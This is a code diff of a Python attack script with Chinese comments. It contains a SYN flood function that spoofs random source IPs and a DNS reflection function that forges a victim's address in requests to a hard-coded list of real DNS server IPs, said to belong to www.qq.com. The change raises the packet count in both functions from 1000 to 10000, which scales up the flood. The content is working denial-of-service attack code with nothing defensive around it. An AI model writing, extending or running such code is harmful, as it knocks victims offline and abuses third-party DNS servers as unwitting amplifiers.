@@ -3,7 +3,6 @@ import random
 import socket
 import struct
 import threading
-
 #www.qq.com 对应的dns服务器的ip地址
 dnsList = ["220.194.111.149","220.194.111.148","157.255.192.44","61.241.44.148","23.211.235.27"]
 
@@ -20,7 +19,7 @@ srcIpList = [randomIPaddr() for i in range(100)]
 def synFlood(targetIP: str, targetPort: int):
     global srcIpList
     # 发送syn数据包的次数
-    for i in range(1000):
+    for i in range(10000):
         sPort = random.randrange(1024, 65535) #随机取源端口
         ipIndex = random.randrange(100) #随机取源ip在列表中的下标
         srcIp = srcIpList[ipIndex] #随机取源ip
@@ -33,7 +32,7 @@ def synFlood(targetIP: str, targetPort: int):
 def dnsReflect(targetIP: str, targetPort: int):
     global srcIpList,dnsList
     # 进行dns反射攻击的次数
-    for i in range(1000):
+    for i in range(10000):
         index = random.randrange(len(dnsList))
         #伪造被攻击者的IP对DNS发出请求，DNS便会返回报文给被攻击者，
         #从而达到让大量的DNS报文返回到被攻击者的目的，占用被攻击者的CPU以及网络资源
